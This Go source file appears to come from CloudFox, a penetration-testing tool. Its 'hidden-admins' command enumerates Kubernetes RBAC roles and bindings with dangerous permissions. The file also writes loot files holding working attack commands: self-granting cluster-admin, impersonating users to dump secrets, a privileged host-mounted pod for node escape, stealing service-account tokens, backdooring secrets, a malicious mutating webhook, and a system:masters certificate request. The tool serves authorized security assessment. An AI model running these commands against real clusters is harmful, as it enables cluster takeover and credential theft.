package commands

import (
	"context"
	"fmt"
	"os"
	"strings"

	"github.com/BishopFox/cloudfox/globals"
	"github.com/BishopFox/cloudfox/internal"
	k8sinternal "github.com/BishopFox/cloudfox/internal/kubernetes"
	"github.com/BishopFox/cloudfox/kubernetes/config"
	"github.com/spf13/cobra"
	v1 "k8s.io/apimachinery/pkg/apis/meta/v1"
)

var HiddenAdminsCmd = &cobra.Command{
	Use:   "hidden-admins",
	Short: "Enumerate roles, users, groups, and service accounts with dangerous or escalatory permissions",
	Long: `
Identify hidden or dangerous administrators in a Kubernetes cluster. This includes:
  - Membership in system:masters group
  - Cluster-admin permissions
  - Ability to create/update Roles, ClusterRoles, RoleBindings, or ClusterRoleBindings
  - Ability to create/update Secrets or ConfigMaps
  - Impersonation rights
  - RBAC aggregation roles
  - Entities who can escalate privileges

Outputs detailed findings and attack paths:
  cloudfox kubernetes hidden-admins`,
	Run: ListHiddenAdmins,
}

type HiddenAdminFinding struct {
	Namespace      string
	Entity         string
	EntityType     string
	Scope          string
	RiskLevel      string
	DangerousPerms string
	Source         string
}

type HiddenAdminsOutput struct {
	Table []internal.TableFile
	Loot  []internal.LootFile
}

func (h HiddenAdminsOutput) TableFiles() []internal.TableFile {
	return h.Table
}

func (h HiddenAdminsOutput) LootFiles() []internal.LootFile {
	return h.Loot
}

func (h HiddenAdminFinding) ToTableRow() []string {
	return []string{
		h.Namespace,
		h.Entity,
		h.EntityType,
		h.Scope,
		h.RiskLevel,
		h.DangerousPerms,
		h.Source,
	}
}

func (h HiddenAdminFinding) Loot() string {
	return fmt.Sprintf(
		"[Hidden Admin Detection]\nRisk Level: %s\nNamespace: %s\nEntity: %s (%s)\nScope: %s\nSource: %s\nDangerous Permissions: %s\n",
		h.RiskLevel,
		h.Namespace,
		h.Entity,
		h.EntityType,
		h.Scope,
		h.Source,
		h.DangerousPerms,
	)
}

func ListHiddenAdmins(cmd *cobra.Command, args []string) {
	ctx := context.Background()
	logger := internal.NewLogger()

	parentCmd := cmd.Parent()
	verbosity, _ := parentCmd.PersistentFlags().GetInt("verbosity")
	wrap, _ := parentCmd.PersistentFlags().GetBool("wrap")
	outputDirectory, _ := parentCmd.PersistentFlags().GetString("outdir")
	format, _ := parentCmd.PersistentFlags().GetString("output")

	logger.InfoM(fmt.Sprintf("Enumerating hidden admin permissions for %s", globals.ClusterName), globals.K8S_HIDDEN_ADMINS_MODULE_NAME)

	clientset := config.GetClientOrExit()

	headers := []string{"Namespace", "Entity", "Type", "Scope", "Risk", "Dangerous Permissions", "Source"}
	var tableRows [][]string
	var lootLines []string

	// ClusterRoles
	clusterRoles, err := clientset.RbacV1().ClusterRoles().List(ctx, v1.ListOptions{})
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error fetching ClusterRoles: %v", err), globals.K8S_HIDDEN_ADMINS_MODULE_NAME)
		return
	}
	for _, role := range clusterRoles.Items {
		var findings []string
		highestRisk := ""

		if role.Name == "cluster-admin" {
			findings = append(findings, "cluster-admin role")
			highestRisk = "CRITICAL"
		}
		if strings.Contains(role.Name, "system:masters") {
			findings = append(findings, "member of system:masters group")
			highestRisk = "CRITICAL"
		}
		if role.AggregationRule != nil && role.AggregationRule.ClusterRoleSelectors != nil && len(role.AggregationRule.ClusterRoleSelectors) > 0 {
			findings = append(findings, "RBAC Aggregation role")
		}
		if role.Rules != nil {
			for _, rule := range role.Rules {
				if k8sinternal.IsDangerousRule(rule) {
					riskLevel := k8sinternal.GetRuleRiskLevel(rule)
					riskDesc := k8sinternal.GetRuleRiskDescription(rule)
					findings = append(findings, riskDesc)

					// Track highest risk level
					if highestRisk == "" || (riskLevel == "CRITICAL") || (riskLevel == "HIGH" && highestRisk != "CRITICAL") {
						highestRisk = riskLevel
					}
				}
			}
		}
		if len(findings) > 0 {
			if highestRisk == "" {
				highestRisk = "MEDIUM"
			}
			row := HiddenAdminFinding{
				Namespace:      "<cluster>",
				Entity:         role.Name,
				EntityType:     "ClusterRole",
				Scope:          "cluster",
				RiskLevel:      highestRisk,
				DangerousPerms: strings.Join(findings, "; "),
				Source:         "ClusterRole definition",
			}
			tableRows = append(tableRows, row.ToTableRow())
			lootLines = append(lootLines, row.Loot())
		}
	}

	// ClusterRoleBindings
	crbs, err := clientset.RbacV1().ClusterRoleBindings().List(ctx, v1.ListOptions{})
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error fetching ClusterRoleBindings: %v", err), globals.K8S_HIDDEN_ADMINS_MODULE_NAME)
		return
	}
	for _, binding := range crbs.Items {
		if binding.Subjects != nil {
			for _, subject := range binding.Subjects {
				ns := subject.Namespace
				if ns == "" {
					ns = "<cluster>"
				}
				role := binding.RoleRef.Name
				riskLevel := ""

				if role == "cluster-admin" || role == "system:masters" {
					riskLevel = "CRITICAL"
				} else if role == "admin" || role == "edit" {
					riskLevel = "HIGH"
				}

				if riskLevel != "" {
					row := HiddenAdminFinding{
						Namespace:      ns,
						Entity:         subject.Name,
						EntityType:     subject.Kind,
						Scope:          "cluster",
						RiskLevel:      riskLevel,
						DangerousPerms: fmt.Sprintf("bound to ClusterRole %s", role),
						Source:         fmt.Sprintf("ClusterRoleBinding %s", binding.Name),
					}
					tableRows = append(tableRows, row.ToTableRow())
					lootLines = append(lootLines, row.Loot())
				}
			}
		}
	}

	// Roles & RoleBindings
	namespaces, err := clientset.CoreV1().Namespaces().List(ctx, v1.ListOptions{})
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error fetching Namespaces: %v", err), globals.K8S_HIDDEN_ADMINS_MODULE_NAME)
		return
	}
	for _, ns := range namespaces.Items {
		// Build map of dangerous roles in this namespace
		dangerousRolesInNS := make(map[string][]string) // roleName -> []findings

		roles, err := clientset.RbacV1().Roles(ns.Name).List(ctx, v1.ListOptions{})
		if err != nil {
			logger.ErrorM(fmt.Sprintf("Error fetching Roles in namespace %s: %v", ns.Name, err), globals.K8S_HIDDEN_ADMINS_MODULE_NAME)
			continue
		}
		for _, role := range roles.Items {
			var findings []string
			highestRisk := ""

			if role.Rules != nil {
				for _, rule := range role.Rules {
					if k8sinternal.IsDangerousRule(rule) {
						riskLevel := k8sinternal.GetRuleRiskLevel(rule)
						riskDesc := k8sinternal.GetRuleRiskDescription(rule)
						findings = append(findings, riskDesc)

						// Track highest risk level
						if highestRisk == "" || (riskLevel == "CRITICAL") || (riskLevel == "HIGH" && highestRisk != "CRITICAL") || (riskLevel == "MEDIUM" && highestRisk != "CRITICAL" && highestRisk != "HIGH") {
							highestRisk = riskLevel
						}
					}
				}
			}
			if len(findings) > 0 {
				if highestRisk == "" {
					highestRisk = "MEDIUM"
				}
				dangerousRolesInNS[role.Name] = findings
				row := HiddenAdminFinding{
					Namespace:      ns.Name,
					Entity:         role.Name,
					EntityType:     "Role",
					Scope:          "namespace",
					RiskLevel:      highestRisk,
					DangerousPerms: strings.Join(findings, "; "),
					Source:         fmt.Sprintf("Role definition (%s)", role.Name),
				}
				tableRows = append(tableRows, row.ToTableRow())
				lootLines = append(lootLines, row.Loot())
			}
		}

		rbs, err := clientset.RbacV1().RoleBindings(ns.Name).List(ctx, v1.ListOptions{})
		if err != nil {
			logger.ErrorM(fmt.Sprintf("Error fetching RoleBindings in namespace %s: %v", ns.Name, err), globals.K8S_HIDDEN_ADMINS_MODULE_NAME)
			continue
		}
		for _, binding := range rbs.Items {
			if binding.Subjects != nil {
				// Check if the role being bound is dangerous
				roleName := binding.RoleRef.Name
				var isDangerousBinding bool
				var bindingPerms string
				var riskLevel string

				// Check if it's a dangerous namespaced role
				if findings, ok := dangerousRolesInNS[roleName]; ok {
					isDangerousBinding = true
					bindingPerms = fmt.Sprintf("bound to Role %s with: %s", roleName, strings.Join(findings, "; "))
					riskLevel = "HIGH"
				}

				// Check if it's binding to a ClusterRole (which might be cluster-admin or other dangerous ClusterRole)
				if binding.RoleRef.Kind == "ClusterRole" {
					if roleName == "cluster-admin" || strings.Contains(roleName, "system:masters") {
						isDangerousBinding = true
						bindingPerms = fmt.Sprintf("bound to ClusterRole %s (namespace-scoped)", roleName)
						riskLevel = "CRITICAL"
					} else if roleName == "admin" {
						isDangerousBinding = true
						bindingPerms = fmt.Sprintf("bound to ClusterRole %s (namespace-scoped)", roleName)
						riskLevel = "HIGH"
					} else if roleName == "edit" {
						isDangerousBinding = true
						bindingPerms = fmt.Sprintf("bound to ClusterRole %s (namespace-scoped)", roleName)
						riskLevel = "MEDIUM"
					}
				}

				// Only add subjects if this is a dangerous binding
				if isDangerousBinding {
					if riskLevel == "" {
						riskLevel = "MEDIUM"
					}
					for _, subject := range binding.Subjects {
						row := HiddenAdminFinding{
							Namespace:      ns.Name,
							Entity:         subject.Name,
							EntityType:     subject.Kind,
							Scope:          "namespace",
							RiskLevel:      riskLevel,
							DangerousPerms: bindingPerms,
							Source:         fmt.Sprintf("RoleBinding %s", binding.Name),
						}
						tableRows = append(tableRows, row.ToTableRow())
						lootLines = append(lootLines, row.Loot())
					}
				}
			}
		}
	}

	// Cross-reference ServiceAccounts with running pods
	var lootSAPodsMap []string
	lootSAPodsMap = append(lootSAPodsMap, `#####################################
##### ServiceAccount to Pod Mapping
#####################################
#
# Which pods are running with dangerous ServiceAccounts
# This helps identify active attack vectors
#
`)

	if globals.KubeContext != "" {
		lootSAPodsMap = append(lootSAPodsMap, fmt.Sprintf("kubectl config use-context %s\n", globals.KubeContext))
	}

	// Build a map of dangerous service accounts
	dangerousSAs := make(map[string]map[string]string) // namespace -> sa -> risk level
	for _, row := range tableRows {
		// Extract namespace, entity, type, and risk level from table rows
		if len(row) >= 5 {
			ns := row[0]
			entity := row[1]
			entityType := row[2]
			riskLevel := row[4]

			if entityType == "ServiceAccount" {
				if dangerousSAs[ns] == nil {
					dangerousSAs[ns] = make(map[string]string)
				}
				dangerousSAs[ns][entity] = riskLevel
			}
		}
	}

	// Query pods to find which ones use these dangerous SAs
	if len(dangerousSAs) > 0 {
		for ns := range dangerousSAs {
			if ns == "<cluster>" {
				continue // Skip cluster-level entries
			}
			pods, err := clientset.CoreV1().Pods(ns).List(ctx, v1.ListOptions{})
			if err != nil {
				continue
			}

			for _, pod := range pods.Items {
				saName := pod.Spec.ServiceAccountName
				if saName == "" {
					saName = "default"
				}

				if riskLevel, found := dangerousSAs[ns][saName]; found {
					lootSAPodsMap = append(lootSAPodsMap, fmt.Sprintf("\n# [%s] Pod: %s/%s uses dangerous ServiceAccount: %s",
						riskLevel, ns, pod.Name, saName))
					lootSAPodsMap = append(lootSAPodsMap, fmt.Sprintf("# Node: %s, Status: %s", pod.Spec.NodeName, pod.Status.Phase))
					lootSAPodsMap = append(lootSAPodsMap, fmt.Sprintf("kubectl exec -it %s -n %s -- /bin/sh", pod.Name, ns))
					lootSAPodsMap = append(lootSAPodsMap, fmt.Sprintf("# Inside pod, extract SA token: cat /var/run/secrets/kubernetes.io/serviceaccount/token"))
					lootSAPodsMap = append(lootSAPodsMap, "")
				}
			}
		}

		if len(lootSAPodsMap) == 2 {
			lootSAPodsMap = append(lootSAPodsMap, "\n# No running pods found using dangerous ServiceAccounts")
			lootSAPodsMap = append(lootSAPodsMap, "# This is good - dangerous SAs exist but aren't actively in use")
		}
	} else {
		lootSAPodsMap = append(lootSAPodsMap, "\n# No dangerous ServiceAccounts detected in findings")
	}

	var lootEnum []string
	lootEnum = append(lootEnum, `#####################################
##### Enumerate Dangerous Permissions
#####################################

`)
	if globals.KubeContext != "" {
		lootEnum = append(lootEnum, fmt.Sprintf("kubectl config use-context %s\n", globals.KubeContext))
	}

	lootEnum = append(lootEnum, `
# Check for system:masters membership
kubectl get clusterrolebindings -o json | jq '.items[] | select(.subjects[]?.name == "system:masters")'
kubectl get clusterrolebindings -o json | jq -r '.items[] | select(.subjects[]?.name=="system:masters")'

# Find impersonation rules
kubectl get clusterroles -o json | jq '.items[] | select(.rules[]? | .verbs[]? | ascii_downcase == "impersonate")'
kubectl get clusterroles -o json | jq -r '.items[] | select(.rules[]?.verbs[]?=="impersonate") | .metadata.name, .rules[]? | select(.verbs[]?=="impersonate")'

# Find Role/ClusterRole creation permissions
kubectl get clusterroles -o json | jq '.items[] | select(.rules[]? | (.verbs[]? | ascii_downcase == "create") and (.resources[]? | ascii_downcase | contains("role") ))'

# Find ConfigMap and Secret modification permissions
kubectl get clusterroles -o json | jq '.items[] | select(.rules[]? | (.verbs[]? | ascii_downcase == "create" or ascii_downcase == "update") and (.resources[]? | ascii_downcase | contains("secret") or contains("configmap") ))'

# Check who can bind cluster-admin
kubectl get clusterroles -o json | jq '.items[] | select(.metadata.name == "cluster-admin")'

# Find cluster-admin bindings (Any subject (User, Group, ServiceAccount) bound to the cluster-admin role.)
kubectl get clusterrolebindings -o json | jq -r '.items[] | select(.roleRef.name=="cluster-admin") | .metadata.name, .subjects[]? | "\(.kind):\(.name) (ns=\(.namespace // "cluster-scope"))"'

# Roles that can escalate privileges via RBAC editing
kubectl get clusterroles -o json | jq -r '.items[] | select(.rules[]? | (.resources[]? | test("roles|clusterroles|rolebindings|clusterrolebindings"))) | .metadata.name, .rules[]'

# Create/modify secrets
kubectl get clusterroles -o json | jq -r '.items[] | select(.rules[]? | (.resources[]?=="secrets") and (.verbs[]? | test("create|update|patch|get"))) | .metadata.name'

# Create/modify configmaps
kubectl get clusterroles -o json | jq -r '.items[] | select(.rules[]? | (.resources[]?=="configmaps") and (.verbs[]? | test("create|update|patch"))) | .metadata.name'

# Wildcard permissions - CRITICAL
kubectl get clusterroles -o json | jq -r '.items[] | select(.rules[]? | (.verbs[]? == "*" or .resources[]? == "*")) | .metadata.name'

# Pod execution permissions
kubectl get clusterroles -o json | jq -r '.items[] | select(.rules[]? | (.resources[]? | test("pods/exec|pods/attach|pods/portforward")) and (.verbs[]? | test("create|get"))) | .metadata.name'

# Admission webhook control - CRITICAL
kubectl get clusterroles -o json | jq -r '.items[] | select(.rules[]? | (.resources[]? | test("validatingwebhookconfigurations|mutatingwebhookconfigurations")) and (.verbs[]? | test("create|update|patch"))) | .metadata.name'

# Certificate approval - HIGH
kubectl get clusterroles -o json | jq -r '.items[] | select(.rules[]? | (.resources[]? | test("certificatesigningrequests")) and (.verbs[]? | test("create|update|approve"))) | .metadata.name'

# Node modification - HIGH
kubectl get clusterroles -o json | jq -r '.items[] | select(.rules[]? | (.resources[]? | test("nodes")) and (.verbs[]? | test("create|update|patch|delete"))) | .metadata.name'

# Namespace-Scoped Permissions

# Namespace-level cluster-admin equivalents
kubectl get rolebindings --all-namespaces -o json | jq -r '.items[] | select(.roleRef.name=="admin" or .roleRef.name=="cluster-admin") | "\(.metadata.namespace): \(.roleRef.name) -> \(.subjects[]?.kind):\(.subjects[]?.name)"'

# Namespace-scoped RBAC modification
kubectl get roles --all-namespaces -o json | jq -r '.items[] | select(.rules[]? | (.resources[]? | test("roles|rolebindings")) and (.verbs[]? | test("create|update|patch"))) | "\(.metadata.namespace): \(.metadata.name)"'

# Namespace impersonation
kubectl get roles --all-namespaces -o json | jq -r '.items[] | select(.rules[]? | (.verbs[]?=="impersonate")) | "\(.metadata.namespace): \(.metadata.name)"'

# Create Pods with elevated privileges
kubectl get roles --all-namespaces -o json | jq -r '.items[] | select(.rules[]? | (.resources[]?=="pods") and (.verbs[]? | test("create"))) | "\(.metadata.namespace): \(.metadata.name)"'

`)

	// Build exploitation techniques loot file
	var lootExploits []string
	lootExploits = append(lootExploits, `#####################################
##### Privilege Escalation Techniques
#####################################
#
# MANUAL EXECUTION REQUIRED
# Actionable exploitation techniques for discovered permissions
#
`)

	if globals.KubeContext != "" {
		lootExploits = append(lootExploits, fmt.Sprintf("kubectl config use-context %s\n", globals.KubeContext))
	}

	lootExploits = append(lootExploits, `
##############################################
## 1. RBAC Modification (Privilege Escalation)
##############################################
# If you can create/update Roles, ClusterRoles, RoleBindings, or ClusterRoleBindings:

# Grant yourself cluster-admin
kubectl create clusterrolebinding pwn --clusterrole=cluster-admin --user=<your-user>
kubectl create clusterrolebinding pwn --clusterrole=cluster-admin --serviceaccount=<namespace>:<serviceaccount>

# Create a custom high-privilege role
cat <<EOF | kubectl apply -f -
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: pwn-role
rules:
- apiGroups: ["*"]
  resources: ["*"]
  verbs: ["*"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: pwn-binding
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: pwn-role
subjects:
- kind: User
  name: <your-user>
  apiGroup: rbac.authorization.k8s.io
EOF

##############################################
## 2. Impersonation (Identity Theft)
##############################################
# If you can impersonate users, groups, or service accounts:

# Test impersonation
kubectl auth can-i --list --as=system:serviceaccount:kube-system:default
kubectl auth can-i --list --as=admin

# Impersonate cluster-admin or high-privilege user
kubectl --as=system:admin get secrets --all-namespaces
kubectl --as=system:serviceaccount:kube-system:default get secrets -n kube-system

# Extract service account tokens by impersonating
kubectl --as=system:serviceaccount:kube-system:admin create token admin -n kube-system --duration=24h

##############################################
## 3. Pod Creation (Container Escape)
##############################################
# If you can create pods:

# Create privileged pod for node escape
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: pwn-pod
  namespace: default
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: pwn
    image: alpine:latest
    securityContext:
      privileged: true
    volumeMounts:
    - name: host
      mountPath: /host
    command: ["/bin/sh"]
    args: ["-c", "sleep 3600"]
  volumes:
  - name: host
    hostPath:
      path: /
      type: Directory
EOF

# Execute into the pod
kubectl exec -it pwn-pod -- /bin/sh
# Inside pod, escape to host:
# chroot /host
# Or use nsenter:
# nsenter --target 1 --mount --uts --ipc --net --pid -- bash

##############################################
## 4. Secret Access (Credential Theft)
##############################################
# If you can read or modify secrets:

# Extract all secrets
kubectl get secrets --all-namespaces -o json | jq -r '.items[] | "\(.metadata.namespace)/\(.metadata.name): \(.data)"'

# Decode specific secret
kubectl get secret <secret-name> -n <namespace> -o jsonpath='{.data}' | jq -r 'to_entries[] | "\(.key)=\(.value | @base64d)"'

# Extract service account tokens
kubectl get secrets --all-namespaces -o json | jq -r '.items[] | select(.type=="kubernetes.io/service-account-token") | "\(.metadata.namespace)/\(.metadata.name)"'

# Modify secret to inject backdoor credentials
kubectl patch secret <secret-name> -n <namespace> -p '{"data":{"password":"YmFja2Rvb3I="}}'

##############################################
## 5. Pod Execution (Runtime Access)
##############################################
# If you can use pods/exec, pods/attach, or pods/portforward:

# Find pods to execute into
kubectl get pods --all-namespaces -o wide

# Execute into pod and steal secrets
kubectl exec -it <pod-name> -n <namespace> -- /bin/sh
# Inside pod:
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# Extract environment variables (may contain secrets)
kubectl exec <pod-name> -n <namespace> -- env

# Port forward to access internal services
kubectl port-forward <pod-name> -n <namespace> 8080:80

##############################################
## 6. Admission Webhook Control (CRITICAL)
##############################################
# If you can create/modify ValidatingWebhookConfiguration or MutatingWebhookConfiguration:

# Intercept ALL cluster API requests
# WARNING: This can break the cluster if misconfigured
cat <<EOF | kubectl apply -f -
apiVersion: admissionregistration.k8s.io/v1
kind: MutatingWebhookConfiguration
metadata:
  name: pwn-webhook
webhooks:
- name: pwn.example.com
  clientConfig:
    url: https://<your-webhook-server>/mutate
  rules:
  - operations: ["CREATE", "UPDATE"]
    apiGroups: ["*"]
    apiVersions: ["*"]
    resources: ["*"]
  admissionReviewVersions: ["v1"]
  sideEffects: None
EOF

# This webhook can:
# - Inject malicious containers into all pods
# - Modify secrets before creation
# - Bypass security policies
# - Capture sensitive data from all API requests

##############################################
## 7. Certificate Approval (Auth Bypass)
##############################################
# If you can create or approve CertificateSigningRequests:

# Create CSR for cluster-admin user
cat <<EOF | kubectl apply -f -
apiVersion: certificates.k8s.io/v1
kind: CertificateSigningRequest
metadata:
  name: pwn-csr
spec:
  request: <base64-encoded-csr>
  signerName: kubernetes.io/kube-apiserver-client
  usages:
  - client auth
  groups:
  - system:masters
EOF

# Approve the CSR
kubectl certificate approve pwn-csr

# Extract the certificate
kubectl get csr pwn-csr -o jsonpath='{.status.certificate}' | base64 -d > pwn.crt

##############################################
## 8. Node Modification (Cluster Disruption)
##############################################
# If you can modify nodes:

# Taint node to evict all pods
kubectl taint nodes <node-name> pwn=true:NoSchedule

# Drain node (evict all pods)
kubectl drain <node-name> --ignore-daemonsets --delete-emptydir-data

# Modify node labels to bypass scheduling constraints
kubectl label nodes <node-name> pwn=true

##############################################
## 9. Attack Path Chaining
##############################################
# Combine multiple permissions for maximum impact:

# Chain 1: Pod Creation → Host Escape → Node Compromise
# 1. Create privileged pod
# 2. Mount host filesystem
# 3. Chroot to host
# 4. Modify kubelet config or steal node credentials

# Chain 2: Secret Read → ServiceAccount Token → RBAC Escalation
# 1. Read service account secrets
# 2. Extract high-privilege SA token
# 3. Use token to create cluster-admin binding
# 4. Full cluster access

# Chain 3: Impersonate → Create Role → Bind to Self
# 1. Impersonate user with RBAC modification rights
# 2. Create cluster-admin role binding for yourself
# 3. Switch back to your identity with full access

# Chain 4: ConfigMap Modify → Pod Environment → Credential Injection
# 1. Modify ConfigMap used by pods
# 2. Inject malicious environment variables
# 3. Wait for pod restart or scale up
# 4. Pods execute with backdoor credentials

`)
	// Output section
	table := internal.TableFile{
		Name:   "Hidden-Admins",
		Header: headers,
		Body:   tableRows,
	}

	lootAdmins := internal.LootFile{
		Name:     "Hidden-Admin-Attack-Paths",
		Contents: strings.Join(k8sinternal.UniqueStrings(lootLines), "\n-----\n"),
	}

	loot := internal.LootFile{
		Name:     "Dangerous-Permissions-Enum",
		Contents: strings.Join(lootEnum, "\n"),
	}

	lootExploitation := internal.LootFile{
		Name:     "Privilege-Escalation-Techniques",
		Contents: strings.Join(lootExploits, "\n"),
	}

	lootSAPods := internal.LootFile{
		Name:     "ServiceAccount-Pod-Mapping",
		Contents: strings.Join(lootSAPodsMap, "\n"),
	}

	err = internal.HandleOutput(
		"Kubernetes",
		format,
		outputDirectory,
		verbosity,
		wrap,
		"Hidden-Admins",
		globals.ClusterName,
		"results",
		HiddenAdminsOutput{
			Table: []internal.TableFile{table},
			Loot:  []internal.LootFile{lootAdmins, loot, lootExploitation, lootSAPods},
		},
	)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error handling output: %v", err), globals.K8S_HIDDEN_ADMINS_MODULE_NAME)
		return
	}

	if len(tableRows) > 0 {
		logger.InfoM(fmt.Sprintf("%d hidden admin findings found", len(tableRows)), globals.K8S_HIDDEN_ADMINS_MODULE_NAME)
	} else {
		logger.InfoM("No hidden admin findings found, skipping output file creation", globals.K8S_HIDDEN_ADMINS_MODULE_NAME)
	}

	logger.InfoM(fmt.Sprintf("For context and next steps: https://github.com/BishopFox/cloudfox/wiki/Kubernetes-Commands#%s", globals.K8S_HIDDEN_ADMINS_MODULE_NAME), globals.K8S_HIDDEN_ADMINS_MODULE_NAME)
}
